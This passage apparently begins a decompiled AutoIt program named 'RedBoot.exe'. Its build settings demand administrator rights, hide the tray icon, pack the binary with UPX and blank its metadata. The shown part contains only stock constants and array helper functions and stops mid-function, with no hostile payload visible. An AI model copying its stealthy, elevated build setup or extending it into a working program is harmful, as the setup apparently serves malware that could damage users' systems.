#NoTrayIcon
#RequireAdmin
#Region
#AutoIt3Wrapper_Outfile=RedBoot.exe
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_UseUpx=y
#AutoIt3Wrapper_Res_Comment=None
#AutoIt3Wrapper_Res_Description=None
#AutoIt3Wrapper_Res_Fileversion=1.0.0.0
#AutoIt3Wrapper_Res_LegalCopyright=None
#AutoIt3Wrapper_Res_Language=1033
#EndRegion
Global Const $OPT_COORDSRELATIVE = 0
Global Const $OPT_COORDSABSOLUTE = 1
Global Const $OPT_COORDSCLIENT = 2
Global Const $OPT_ERRORSILENT = 0
Global Const $OPT_ERRORFATAL = 1
Global Const $OPT_CAPSNOSTORE = 0
Global Const $OPT_CAPSSTORE = 1
Global Const $OPT_MATCHSTART = 1
Global Const $OPT_MATCHANY = 2
Global Const $OPT_MATCHEXACT = 3
Global Const $OPT_MATCHADVANCED = 4
Global Const $CCS_TOP = 1
Global Const $CCS_NOMOVEY = 2
Global Const $CCS_BOTTOM = 3
Global Const $CCS_NORESIZE = 4
Global Const $CCS_NOPARENTALIGN = 8
Global Const $CCS_NOHILITE = 16
Global Const $CCS_ADJUSTABLE = 32
Global Const $CCS_NODIVIDER = 64
Global Const $CCS_VERT = 128
Global Const $CCS_LEFT = 129
Global Const $CCS_NOMOVEX = 130
Global Const $CCS_RIGHT = 131
Global Const $DT_DRIVETYPE = 1
Global Const $DT_SSDSTATUS = 2
Global Const $DT_BUSTYPE = 3
Global Const $PROXY_IE = 0
Global Const $PROXY_NONE = 1
Global Const $PROXY_SPECIFIED = 2
Global Const $OBJID_WINDOW = 0
Global Const $OBJID_TITLEBAR = 4294967294
Global Const $OBJID_SIZEGRIP = 4294967289
Global Const $OBJID_CARET = 4294967288
Global Const $OBJID_CURSOR = 4294967287
Global Const $OBJID_ALERT = 4294967286
Global Const $OBJID_SOUND = 4294967285
Global Const $DLG_CENTERONTOP = 0
Global Const $DLG_NOTITLE = 1
Global Const $DLG_NOTONTOP = 2
Global Const $DLG_TEXTLEFT = 4
Global Const $DLG_TEXTRIGHT = 8
Global Const $DLG_MOVEABLE = 16
Global Const $DLG_TEXTVCENTER = 32
Global Const $IDC_UNKNOWN = 0
Global Const $IDC_APPSTARTING = 1
Global Const $IDC_ARROW = 2
Global Const $IDC_CROSS = 3
Global Const $IDC_HAND = 32649
Global Const $IDC_HELP = 4
Global Const $IDC_IBEAM = 5
Global Const $IDC_ICON = 6
Global Const $IDC_NO = 7
Global Const $IDC_SIZE = 8
Global Const $IDC_SIZEALL = 9
Global Const $IDC_SIZENESW = 10
Global Const $IDC_SIZENS = 11
Global Const $IDC_SIZENWSE = 12
Global Const $IDC_SIZEWE = 13
Global Const $IDC_UPARROW = 14
Global Const $IDC_WAIT = 15
Global Const $IDI_APPLICATION = 32512
Global Const $IDI_ASTERISK = 32516
Global Const $IDI_EXCLAMATION = 32515
Global Const $IDI_HAND = 32513
Global Const $IDI_QUESTION = 32514
Global Const $IDI_WINLOGO = 32517
Global Const $IDI_SHIELD = 32518
Global Const $IDI_ERROR = $IDI_HAND
Global Const $IDI_INFORMATION = $IDI_ASTERISK
Global Const $IDI_WARNING = $IDI_EXCLAMATION
Global Const $SD_LOGOFF = 0
Global Const $SD_SHUTDOWN = 1
Global Const $SD_REBOOT = 2
Global Const $SD_FORCE = 4
Global Const $SD_POWERDOWN = 8
Global Const $SD_FORCEHUNG = 16
Global Const $SD_STANDBY = 32
Global Const $SD_HIBERNATE = 64
Global Const $STDIN_CHILD = 1
Global Const $STDOUT_CHILD = 2
Global Const $STDERR_CHILD = 4
Global Const $STDERR_MERGED = 8
Global Const $STDIO_INHERIT_PARENT = 16
Global Const $RUN_CREATE_NEW_CONSOLE = 65536
Global Const $UBOUND_DIMENSIONS = 0
Global Const $UBOUND_ROWS = 1
Global Const $UBOUND_COLUMNS = 2
Global Const $MOUSEEVENTF_ABSOLUTE = 32768
Global Const $MOUSEEVENTF_MOVE = 1
Global Const $MOUSEEVENTF_LEFTDOWN = 2
Global Const $MOUSEEVENTF_LEFTUP = 4
Global Const $MOUSEEVENTF_RIGHTDOWN = 8
Global Const $MOUSEEVENTF_RIGHTUP = 16
Global Const $MOUSEEVENTF_MIDDLEDOWN = 32
Global Const $MOUSEEVENTF_MIDDLEUP = 64
Global Const $MOUSEEVENTF_WHEEL = 2048
Global Const $MOUSEEVENTF_XDOWN = 128
Global Const $MOUSEEVENTF_XUP = 256
Global Const $REG_NONE = 0
Global Const $REG_SZ = 1
Global Const $REG_EXPAND_SZ = 2
Global Const $REG_BINARY = 3
Global Const $REG_DWORD = 4
Global Const $REG_DWORD_LITTLE_ENDIAN = 4
Global Const $REG_DWORD_BIG_ENDIAN = 5
Global Const $REG_LINK = 6
Global Const $REG_MULTI_SZ = 7
Global Const $REG_RESOURCE_LIST = 8
Global Const $REG_FULL_RESOURCE_DESCRIPTOR = 9
Global Const $REG_RESOURCE_REQUIREMENTS_LIST = 10
Global Const $REG_QWORD = 11
Global Const $REG_QWORD_LITTLE_ENDIAN = 11
Global Const $HWND_BOTTOM = 1
Global Const $HWND_NOTOPMOST = + 4294967294
Global Const $HWND_TOP = 0
Global Const $HWND_TOPMOST = + 4294967295
Global Const $SWP_NOSIZE = 1
Global Const $SWP_NOMOVE = 2
Global Const $SWP_NOZORDER = 4
Global Const $SWP_NOREDRAW = 8
Global Const $SWP_NOACTIVATE = 16
Global Const $SWP_FRAMECHANGED = 32
Global Const $SWP_DRAWFRAME = 32
Global Const $SWP_SHOWWINDOW = 64
Global Const $SWP_HIDEWINDOW = 128
Global Const $SWP_NOCOPYBITS = 256
Global Const $SWP_NOOWNERZORDER = 512
Global Const $SWP_NOREPOSITION = 512
Global Const $SWP_NOSENDCHANGING = 1024
Global Const $SWP_DEFERERASE = 8192
Global Const $SWP_ASYNCWINDOWPOS = 16384
Global Const $KEYWORD_DEFAULT = 1
Global Const $KEYWORD_NULL = 2
Global Const $DECLARED_LOCAL = + 4294967295
Global Const $DECLARED_UNKNOWN = 0
Global Const $DECLARED_GLOBAL = 1
Global Const $ASSIGN_CREATE = 0
Global Const $ASSIGN_FORCELOCAL = 1
Global Const $ASSIGN_FORCEGLOBAL = 2
Global Const $ASSIGN_EXISTFAIL = 4
Global Const $BI_ENABLE = 0
Global Const $BI_DISABLE = 1
Global Const $BREAK_ENABLE = 1
Global Const $BREAK_DISABLE = 0
Global Const $CDTRAY_OPEN = "open"
Global Const $CDTRAY_CLOSED = "closed"
Global Const $SEND_DEFAULT = 0
Global Const $SEND_RAW = 1
Global Const $DIR_DEFAULT = 0
Global Const $DIR_EXTENDED = 1
Global Const $DIR_NORECURSE = 2
Global Const $DIR_REMOVE = 1
Global Const $DT_ALL = "ALL"
Global Const $DT_CDROM = "CDROM"
Global Const $DT_REMOVABLE = "REMOVABLE"
Global Const $DT_FIXED = "FIXED"
Global Const $DT_NETWORK = "NETWORK"
Global Const $DT_RAMDISK = "RAMDISK"
Global Const $DT_UNKNOWN = "UNKNOWN"
Global Const $DT_UNDEFINED = 1
Global Const $DT_FAT = "FAT"
Global Const $DT_FAT32 = "FAT32"
Global Const $DT_EXFAT = "exFAT"
Global Const $DT_NTFS = "NTFS"
Global Const $DT_NWFS = "NWFS"
Global Const $DT_CDFS = "CDFS"
Global Const $DT_UDF = "UDF"
Global Const $DMA_DEFAULT = 0
Global Const $DMA_PERSISTENT = 1
Global Const $DMA_AUTHENTICATION = 8
Global Const $DS_UNKNOWN = "UNKNOWN"
Global Const $DS_READY = "READY"
Global Const $DS_NOTREADY = "NOTREADY"
Global Const $DS_INVALID = "INVALID"
Global Const $MOUSE_CLICK_LEFT = "left"
Global Const $MOUSE_CLICK_RIGHT = "right"
Global Const $MOUSE_CLICK_MIDDLE = "middle"
Global Const $MOUSE_CLICK_MAIN = "main"
Global Const $MOUSE_CLICK_MENU = "menu"
Global Const $MOUSE_CLICK_PRIMARY = "primary"
Global Const $MOUSE_CLICK_SECONDARY = "secondary"
Global Const $MOUSE_WHEEL_UP = "up"
Global Const $MOUSE_WHEEL_DOWN = "down"
Global Const $NUMBER_AUTO = 0
Global Const $NUMBER_32BIT = 1
Global Const $NUMBER_64BIT = 2
Global Const $NUMBER_DOUBLE = 3
Global Const $OBJ_NAME = 1
Global Const $OBJ_STRING = 2
Global Const $OBJ_PROGID = 3
Global Const $OBJ_FILE = 4
Global Const $OBJ_MODULE = 5
Global Const $OBJ_CLSID = 6
Global Const $OBJ_IID = 7
Global Const $EXITCLOSE_NORMAL = 0
Global Const $EXITCLOSE_BYEXIT = 1
Global Const $EXITCLOSE_BYCLICK = 2
Global Const $EXITCLOSE_BYLOGOFF = 3
Global Const $EXITCLOSE_BYSUTDOWN = 4
Global Const $PROCESS_STATS_MEMORY = 0
Global Const $PROCESS_STATS_IO = 1
Global Const $PROCESS_LOW = 0
Global Const $PROCESS_BELOWNORMAL = 1
Global Const $PROCESS_NORMAL = 2
Global Const $PROCESS_ABOVENORMAL = 3
Global Const $PROCESS_HIGH = 4
Global Const $PROCESS_REALTIME = 5
Global Const $RUN_LOGON_NOPROFILE = 0
Global Const $RUN_LOGON_PROFILE = 1
Global Const $RUN_LOGON_NETWORK = 2
Global Const $RUN_LOGON_INHERIT = 4
Global Const $SOUND_NOWAIT = 0
Global Const $SOUND_WAIT = 1
Global Const $SHEX_OPEN = "open"
Global Const $SHEX_EDIT = "edit"
Global Const $SHEX_PRINT = "print"
Global Const $SHEX_PROPERTIES = "properties"
Global Const $TCP_DATA_DEFAULT = 0
Global Const $TCP_DATA_BINARY = 1
Global Const $UDP_OPEN_DEFAULT = 0
Global Const $UDP_OPEN_BROADCAST = 1
Global Const $UDP_DATA_DEFAULT = 0
Global Const $UDP_DATA_BINARY = 1
Global Const $UDP_DATA_ARRAY = 2
Global Const $TIP_NOICON = 0
Global Const $TIP_INFOICON = 1
Global Const $TIP_WARNINGICON = 2
Global Const $TIP_ERRORICON = 3
Global Const $TIP_BALLOON = 1
Global Const $TIP_CENTER = 2
Global Const $TIP_FORCEVISIBLE = 4
Global Const $WINDOWS_NOONTOP = 0
Global Const $WINDOWS_ONTOP = 1
Global Const $MB_OK = 0
Global Const $MB_OKCANCEL = 1
Global Const $MB_ABORTRETRYIGNORE = 2
Global Const $MB_YESNOCANCEL = 3
Global Const $MB_YESNO = 4
Global Const $MB_RETRYCANCEL = 5
Global Const $MB_CANCELTRYCONTINUE = 6
Global Const $MB_HELP = 16384
Global Const $MB_ICONSTOP = 16
Global Const $MB_ICONERROR = 16
Global Const $MB_ICONHAND = 16
Global Const $MB_ICONQUESTION = 32
Global Const $MB_ICONEXCLAMATION = 48
Global Const $MB_ICONWARNING = 48
Global Const $MB_ICONINFORMATION = 64
Global Const $MB_ICONASTERISK = 64
Global Const $MB_USERICON = 128
Global Const $MB_DEFBUTTON1 = 0
Global Const $MB_DEFBUTTON2 = 256
Global Const $MB_DEFBUTTON3 = 512
Global Const $MB_DEFBUTTON4 = 768
Global Const $MB_APPLMODAL = 0
Global Const $MB_SYSTEMMODAL = 4096
Global Const $MB_TASKMODAL = 8192
Global Const $MB_DEFAULT_DESKTOP_ONLY = 131072
Global Const $MB_RIGHT = 524288
Global Const $MB_RTLREADING = 1048576
Global Const $MB_SETFOREGROUND = 65536
Global Const $MB_TOPMOST = 262144
Global Const $MB_SERVICE_NOTIFICATION = 2097152
Global Const $MB_RIGHTJUSTIFIED = $MB_RIGHT
Global Const $IDTIMEOUT = + 4294967295
Global Const $IDOK = 1
Global Const $IDCANCEL = 2
Global Const $IDABORT = 3
Global Const $IDRETRY = 4
Global Const $IDIGNORE = 5
Global Const $IDYES = 6
Global Const $IDNO = 7
Global Const $IDCLOSE = 8
Global Const $IDHELP = 9
Global Const $IDTRYAGAIN = 10
Global Const $IDCONTINUE = 11
Global Const $STR_NOCASESENSE = 0
Global Const $STR_CASESENSE = 1
Global Const $STR_NOCASESENSEBASIC = 2
Global Const $STR_STRIPLEADING = 1
Global Const $STR_STRIPTRAILING = 2
Global Const $STR_STRIPSPACES = 4
Global Const $STR_STRIPALL = 8
Global Const $STR_CHRSPLIT = 0
Global Const $STR_ENTIRESPLIT = 1
Global Const $STR_NOCOUNT = 2
Global Const $STR_REGEXPMATCH = 0
Global Const $STR_REGEXPARRAYMATCH = 1
Global Const $STR_REGEXPARRAYFULLMATCH = 2
Global Const $STR_REGEXPARRAYGLOBALMATCH = 3
Global Const $STR_REGEXPARRAYGLOBALFULLMATCH = 4
Global Const $STR_ENDISSTART = 0
Global Const $STR_ENDNOTSTART = 1
Global Const $SB_ANSI = 1
Global Const $SB_UTF16LE = 2
Global Const $SB_UTF16BE = 3
Global Const $SB_UTF8 = 4
Global Const $SE_UTF16 = 0
Global Const $SE_ANSI = 1
Global Const $SE_UTF8 = 2
Global Const $STR_UTF16 = 0
Global Const $STR_UCS2 = 1
Global Enum $ARRAYFILL_FORCE_DEFAULT , $ARRAYFILL_FORCE_SINGLEITEM , $ARRAYFILL_FORCE_INT , $ARRAYFILL_FORCE_NUMBER , $ARRAYFILL_FORCE_PTR , $ARRAYFILL_FORCE_HWND , $ARRAYFILL_FORCE_STRING
Global Enum $ARRAYUNIQUE_NOCOUNT , $ARRAYUNIQUE_COUNT
Global Enum $ARRAYUNIQUE_AUTO , $ARRAYUNIQUE_FORCE32 , $ARRAYUNIQUE_FORCE64 , $ARRAYUNIQUE_MATCH , $ARRAYUNIQUE_DISTINCT
Func _ARRAYADD ( ByRef $AARRAY , $VVALUE , $ISTART = 0 , $SDELIM_ITEM = "|" , $SDELIM_ROW = @CRLF , $IFORCE = $ARRAYFILL_FORCE_DEFAULT )
	If $ISTART = Default Then $ISTART = 0
	If $SDELIM_ITEM = Default Then $SDELIM_ITEM = "|"
	If $SDELIM_ROW = Default Then $SDELIM_ROW = @CRLF
	If $IFORCE = Default Then $IFORCE = $ARRAYFILL_FORCE_DEFAULT
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $IDIM_1 = UBound ( $AARRAY , $UBOUND_ROWS )
	Local $HDATATYPE = 0
	Switch $IFORCE
	Case $ARRAYFILL_FORCE_INT
		$HDATATYPE = Int
	Case $ARRAYFILL_FORCE_NUMBER
		$HDATATYPE = Number
	Case $ARRAYFILL_FORCE_PTR
		$HDATATYPE = Ptr
	Case $ARRAYFILL_FORCE_HWND
		$HDATATYPE = HWnd
	Case $ARRAYFILL_FORCE_STRING
		$HDATATYPE = String
	EndSwitch
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		If $IFORCE = $ARRAYFILL_FORCE_SINGLEITEM Then
			ReDim $AARRAY [ $IDIM_1 + 1 ]
			$AARRAY [ $IDIM_1 ] = $VVALUE
			Return $IDIM_1
		EndIf
		If IsArray ( $VVALUE ) Then
			If UBound ( $VVALUE , $UBOUND_DIMENSIONS ) <> 1 Then Return SetError ( 5 , 0 , + 4294967295 )
			$HDATATYPE = 0
		Else
			Local $ATMP = StringSplit ( $VVALUE , $SDELIM_ITEM , $STR_NOCOUNT + $STR_ENTIRESPLIT )
			If UBound ( $ATMP , $UBOUND_ROWS ) = 1 Then
				$ATMP [ 0 ] = $VVALUE
			EndIf
			$VVALUE = $ATMP
		EndIf
		Local $IADD = UBound ( $VVALUE , $UBOUND_ROWS )
		ReDim $AARRAY [ $IDIM_1 + $IADD ]
		For $I = 0 To $IADD + 4294967295
			If IsFunc ( $HDATATYPE ) Then
				$AARRAY [ $IDIM_1 + $I ] = $HDATATYPE ( $VVALUE [ $I ] )
			Else
				$AARRAY [ $IDIM_1 + $I ] = $VVALUE [ $I ]
			EndIf
		Next
		Return $IDIM_1 + $IADD + 4294967295
	Case 2
		Local $IDIM_2 = UBound ( $AARRAY , $UBOUND_COLUMNS )
		If $ISTART < 0 Or $ISTART > $IDIM_2 + 4294967295 Then Return SetError ( 4 , 0 , + 4294967295 )
		Local $IVALDIM_1 , $IVALDIM_2 = 0 , $ICOLCOUNT
		If IsArray ( $VVALUE ) Then
			If UBound ( $VVALUE , $UBOUND_DIMENSIONS ) <> 2 Then Return SetError ( 5 , 0 , + 4294967295 )
			$IVALDIM_1 = UBound ( $VVALUE , $UBOUND_ROWS )
			$IVALDIM_2 = UBound ( $VVALUE , $UBOUND_COLUMNS )
			$HDATATYPE = 0
		Else
			Local $ASPLIT_1 = StringSplit ( $VVALUE , $SDELIM_ROW , $STR_NOCOUNT + $STR_ENTIRESPLIT )
			$IVALDIM_1 = UBound ( $ASPLIT_1 , $UBOUND_ROWS )
			Local $ATMP [ $IVALDIM_1 ] [ 0 ] , $ASPLIT_2
			For $I = 0 To $IVALDIM_1 + 4294967295
				$ASPLIT_2 = StringSplit ( $ASPLIT_1 [ $I ] , $SDELIM_ITEM , $STR_NOCOUNT + $STR_ENTIRESPLIT )
				$ICOLCOUNT = UBound ( $ASPLIT_2 )
				If $ICOLCOUNT > $IVALDIM_2 Then
					$IVALDIM_2 = $ICOLCOUNT
					ReDim $ATMP [ $IVALDIM_1 ] [ $IVALDIM_2 ]
				EndIf
				For $J = 0 To $ICOLCOUNT + 4294967295
					$ATMP [ $I ] [ $J ] = $ASPLIT_2 [ $J ]
				Next
			Next
			$VVALUE = $ATMP
		EndIf
		If UBound ( $VVALUE , $UBOUND_COLUMNS ) + $ISTART > UBound ( $AARRAY , $UBOUND_COLUMNS ) Then Return SetError ( 3 , 0 , + 4294967295 )
		ReDim $AARRAY [ $IDIM_1 + $IVALDIM_1 ] [ $IDIM_2 ]
		For $IWRITETO_INDEX = 0 To $IVALDIM_1 + 4294967295
			For $J = 0 To $IDIM_2 + 4294967295
				If $J < $ISTART Then
					$AARRAY [ $IWRITETO_INDEX + $IDIM_1 ] [ $J ] = ""
				ElseIf $J - $ISTART > $IVALDIM_2 + 4294967295 Then
					$AARRAY [ $IWRITETO_INDEX + $IDIM_1 ] [ $J ] = ""
				Else
					If IsFunc ( $HDATATYPE ) Then
						$AARRAY [ $IWRITETO_INDEX + $IDIM_1 ] [ $J ] = $HDATATYPE ( $VVALUE [ $IWRITETO_INDEX ] [ $J - $ISTART ] )
					Else
						$AARRAY [ $IWRITETO_INDEX + $IDIM_1 ] [ $J ] = $VVALUE [ $IWRITETO_INDEX ] [ $J - $ISTART ]
					EndIf
				EndIf
			Next
		Next
Case Else
		Return SetError ( 2 , 0 , + 4294967295 )
	EndSwitch
	Return UBound ( $AARRAY , $UBOUND_ROWS ) + 4294967295
EndFunc
Func _ARRAYBINARYSEARCH ( Const ByRef $AARRAY , $VVALUE , $ISTART = 0 , $IEND = 0 , $ICOLUMN = 0 )
	If $ISTART = Default Then $ISTART = 0
	If $IEND = Default Then $IEND = 0
	If $ICOLUMN = Default Then $ICOLUMN = 0
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $IDIM_1 = UBound ( $AARRAY , $UBOUND_ROWS )
	If $IDIM_1 = 0 Then Return SetError ( 6 , 0 , + 4294967295 )
	If $IEND < 1 Or $IEND > $IDIM_1 + 4294967295 Then $IEND = $IDIM_1 + 4294967295
	If $ISTART < 0 Then $ISTART = 0
	If $ISTART > $IEND Then Return SetError ( 4 , 0 , + 4294967295 )
	Local $IMID = Int ( ( $IEND + $ISTART ) / 2 )
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		If $AARRAY [ $ISTART ] > $VVALUE Or $AARRAY [ $IEND ] < $VVALUE Then Return SetError ( 2 , 0 , + 4294967295 )
		While $ISTART <= $IMID And $VVALUE <> $AARRAY [ $IMID ]
			If $VVALUE < $AARRAY [ $IMID ] Then
				$IEND = $IMID + 4294967295
			Else
				$ISTART = $IMID + 1
			EndIf
			$IMID = Int ( ( $IEND + $ISTART ) / 2 )
		WEnd
		If $ISTART > $IEND Then Return SetError ( 3 , 0 , + 4294967295 )
	Case 2
		Local $IDIM_2 = UBound ( $AARRAY , $UBOUND_COLUMNS ) + 4294967295
		If $ICOLUMN < 0 Or $ICOLUMN > $IDIM_2 Then Return SetError ( 7 , 0 , + 4294967295 )
		If $AARRAY [ $ISTART ] [ $ICOLUMN ] > $VVALUE Or $AARRAY [ $IEND ] [ $ICOLUMN ] < $VVALUE Then Return SetError ( 2 , 0 , + 4294967295 )
		While $ISTART <= $IMID And $VVALUE <> $AARRAY [ $IMID ] [ $ICOLUMN ]
			If $VVALUE < $AARRAY [ $IMID ] [ $ICOLUMN ] Then
				$IEND = $IMID + 4294967295
			Else
				$ISTART = $IMID + 1
			EndIf
			$IMID = Int ( ( $IEND + $ISTART ) / 2 )
		WEnd
		If $ISTART > $IEND Then Return SetError ( 3 , 0 , + 4294967295 )
Case Else
		Return SetError ( 5 , 0 , + 4294967295 )
	EndSwitch
	Return $IMID
EndFunc
Func _ARRAYCOLDELETE ( ByRef $AARRAY , $ICOLUMN , $BCONVERT = False )
	If $BCONVERT = Default Then $BCONVERT = False
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $IDIM_1 = UBound ( $AARRAY , $UBOUND_ROWS )
	If UBound ( $AARRAY , $UBOUND_DIMENSIONS ) <> 2 Then Return SetError ( 2 , 0 , + 4294967295 )
	Local $IDIM_2 = UBound ( $AARRAY , $UBOUND_COLUMNS )
	Switch $IDIM_2
	Case 2
		If $ICOLUMN < 0 Or $ICOLUMN > 1 Then Return SetError ( 3 , 0 , + 4294967295 )
		If $BCONVERT Then
			Local $ATEMPARRAY [ $IDIM_1 ]
			For $I = 0 To $IDIM_1 + 4294967295
				$ATEMPARRAY [ $I ] = $AARRAY [ $I ] [ ( Not $ICOLUMN ) ]
			Next
			$AARRAY = $ATEMPARRAY
		Else
			ContinueCase
		EndIf
Case Else
		If $ICOLUMN < 0 Or $ICOLUMN > $IDIM_2 + 4294967295 Then Return SetError ( 3 , 0 , + 4294967295 )
		For $I = 0 To $IDIM_1 + 4294967295
			For $J = $ICOLUMN To $IDIM_2 + 4294967294
				$AARRAY [ $I ] [ $J ] = $AARRAY [ $I ] [ $J + 1 ]
			Next
		Next
		ReDim $AARRAY [ $IDIM_1 ] [ $IDIM_2 + 4294967295 ]
	EndSwitch
	Return UBound ( $AARRAY , $UBOUND_COLUMNS )
EndFunc
Func _ARRAYCOLINSERT ( ByRef $AARRAY , $ICOLUMN )
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $IDIM_1 = UBound ( $AARRAY , $UBOUND_ROWS )
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		Local $ATEMPARRAY [ $IDIM_1 ] [ 2 ]
		Switch $ICOLUMN
		Case 0 , 1
			For $I = 0 To $IDIM_1 + 4294967295
				$ATEMPARRAY [ $I ] [ ( Not $ICOLUMN ) ] = $AARRAY [ $I ]
			Next
	Case Else
			Return SetError ( 3 , 0 , + 4294967295 )
		EndSwitch
		$AARRAY = $ATEMPARRAY
	Case 2
		Local $IDIM_2 = UBound ( $AARRAY , $UBOUND_COLUMNS )
		If $ICOLUMN < 0 Or $ICOLUMN > $IDIM_2 Then Return SetError ( 3 , 0 , + 4294967295 )
		ReDim $AARRAY [ $IDIM_1 ] [ $IDIM_2 + 1 ]
		For $I = 0 To $IDIM_1 + 4294967295
			For $J = $IDIM_2 To $ICOLUMN + 1 Step + 4294967295
				$AARRAY [ $I ] [ $J ] = $AARRAY [ $I ] [ $J + 4294967295 ]
			Next
			$AARRAY [ $I ] [ $ICOLUMN ] = ""
		Next
Case Else
		Return SetError ( 2 , 0 , + 4294967295 )
	EndSwitch
	Return UBound ( $AARRAY , $UBOUND_COLUMNS )
EndFunc
Func _ARRAYCOMBINATIONS ( Const ByRef $AARRAY , $ISET , $SDELIMITER = "" )
	If $SDELIMITER = Default Then $SDELIMITER = ""
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , 0 )
	If UBound ( $AARRAY , $UBOUND_DIMENSIONS ) <> 1 Then Return SetError ( 2 , 0 , 0 )
	Local $IN = UBound ( $AARRAY )
	Local $IR = $ISET
	Local $AIDX [ $IR ]
	For $I = 0 To $IR + 4294967295
		$AIDX [ $I ] = $I
	Next
	Local $ITOTAL = __ARRAY_COMBINATIONS ( $IN , $IR )
	Local $ILEFT = $ITOTAL
	Local $ARESULT [ $ITOTAL + 1 ]
	$ARESULT [ 0 ] = $ITOTAL
	Local $ICOUNT = 1
	While $ILEFT > 0
		__ARRAY_GETNEXT ( $IN , $IR , $ILEFT , $ITOTAL , $AIDX )
		For $I = 0 To $ISET + 4294967295
			$ARESULT [ $ICOUNT ] &= $AARRAY [ $AIDX [ $I ] ] & $SDELIMITER
		Next
		If $SDELIMITER <> "" Then $ARESULT [ $ICOUNT ] = StringTrimRight ( $ARESULT [ $ICOUNT ] , 1 )
		$ICOUNT += 1
	WEnd
	Return $ARESULT
EndFunc
Func _ARRAYCONCATENATE ( ByRef $AARRAYTARGET , Const ByRef $AARRAYSOURCE , $ISTART = 0 )
	If $ISTART = Default Then $ISTART = 0
	If Not IsArray ( $AARRAYTARGET ) Then Return SetError ( 1 , 0 , + 4294967295 )
	If Not IsArray ( $AARRAYSOURCE ) Then Return SetError ( 2 , 0 , + 4294967295 )
	Local $IDIM_TOTAL_TGT = UBound ( $AARRAYTARGET , $UBOUND_DIMENSIONS )
	Local $IDIM_TOTAL_SRC = UBound ( $AARRAYSOURCE , $UBOUND_DIMENSIONS )
	Local $IDIM_1_TGT = UBound ( $AARRAYTARGET , $UBOUND_ROWS )
	Local $IDIM_1_SRC = UBound ( $AARRAYSOURCE , $UBOUND_ROWS )
	If $ISTART < 0 Or $ISTART > $IDIM_1_SRC + 4294967295 Then Return SetError ( 6 , 0 , + 4294967295 )
	Switch $IDIM_TOTAL_TGT
	Case 1
		If $IDIM_TOTAL_SRC <> 1 Then Return SetError ( 4 , 0 , + 4294967295 )
		ReDim $AARRAYTARGET [ $IDIM_1_TGT + $IDIM_1_SRC - $ISTART ]
		For $I = $ISTART To $IDIM_1_SRC + 4294967295
			$AARRAYTARGET [ $IDIM_1_TGT + $I - $ISTART ] = $AARRAYSOURCE [ $I ]
		Next
	Case 2
		If $IDIM_TOTAL_SRC <> 2 Then Return SetError ( 4 , 0 , + 4294967295 )
		Local $IDIM_2_TGT = UBound ( $AARRAYTARGET , $UBOUND_COLUMNS )
		If UBound ( $AARRAYSOURCE , $UBOUND_COLUMNS ) <> $IDIM_2_TGT Then Return SetError ( 5 , 0 , + 4294967295 )
		ReDim $AARRAYTARGET [ $IDIM_1_TGT + $IDIM_1_SRC - $ISTART ] [ $IDIM_2_TGT ]
		For $I = $ISTART To $IDIM_1_SRC + 4294967295
			For $J = 0 To $IDIM_2_TGT + 4294967295
				$AARRAYTARGET [ $IDIM_1_TGT + $I - $ISTART ] [ $J ] = $AARRAYSOURCE [ $I ] [ $J ]
			Next
		Next
Case Else
		Return SetError ( 3 , 0 , + 4294967295 )
	EndSwitch
	Return UBound ( $AARRAYTARGET , $UBOUND_ROWS )
EndFunc
Func _ARRAYDELETE ( ByRef $AARRAY , $VRANGE )
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $IDIM_1 = UBound ( $AARRAY , $UBOUND_ROWS ) + 4294967295
	If IsArray ( $VRANGE ) Then
		If UBound ( $VRANGE , $UBOUND_DIMENSIONS ) <> 1 Or UBound ( $VRANGE , $UBOUND_ROWS ) < 2 Then Return SetError ( 4 , 0 , + 4294967295 )
	Else
		Local $INUMBER , $ASPLIT_1 , $ASPLIT_2
		$VRANGE = StringStripWS ( $VRANGE , 8 )
		$ASPLIT_1 = StringSplit ( $VRANGE , ";" )
		$VRANGE = ""
		For $I = 1 To $ASPLIT_1 [ 0 ]
			If Not StringRegExp ( $ASPLIT_1 [ $I ] , "^\d+(-\d+)?$" ) Then Return SetError ( 3 , 0 , + 4294967295 )
			$ASPLIT_2 = StringSplit ( $ASPLIT_1 [ $I ] , "-" )
			Switch $ASPLIT_2 [ 0 ]
			Case 1
				$VRANGE &= $ASPLIT_2 [ 1 ] & ";"
			Case 2
				If Number ( $ASPLIT_2 [ 2 ] ) >= Number ( $ASPLIT_2 [ 1 ] ) Then
					$INUMBER = $ASPLIT_2 [ 1 ] + 4294967295
					Do
						$INUMBER += 1
						$VRANGE &= $INUMBER & ";"
					Until $INUMBER = $ASPLIT_2 [ 2 ]
				EndIf
			EndSwitch
		Next
		$VRANGE = StringSplit ( StringTrimRight ( $VRANGE , 1 ) , ";" )
	EndIf
	If $VRANGE [ 1 ] < 0 Or $VRANGE [ $VRANGE [ 0 ] ] > $IDIM_1 Then Return SetError ( 5 , 0 , + 4294967295 )
	Local $ICOPYTO_INDEX = 0
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		For $I = 1 To $VRANGE [ 0 ]
			$AARRAY [ $VRANGE [ $I ] ] = ChrW ( 64177 )
		Next
		For $IREADFROM_INDEX = 0 To $IDIM_1
			If $AARRAY [ $IREADFROM_INDEX ] == ChrW ( 64177 ) Then
				ContinueLoop
			Else
				If $IREADFROM_INDEX <> $ICOPYTO_INDEX Then
					$AARRAY [ $ICOPYTO_INDEX ] = $AARRAY [ $IREADFROM_INDEX ]
				EndIf
				$ICOPYTO_INDEX += 1
			EndIf
		Next
		ReDim $AARRAY [ $IDIM_1 - $VRANGE [ 0 ] + 1 ]
	Case 2
		Local $IDIM_2 = UBound ( $AARRAY , $UBOUND_COLUMNS ) + 4294967295
		For $I = 1 To $VRANGE [ 0 ]
			$AARRAY [ $VRANGE [ $I ] ] [ 0 ] = ChrW ( 64177 )
		Next
		For $IREADFROM_INDEX = 0 To $IDIM_1
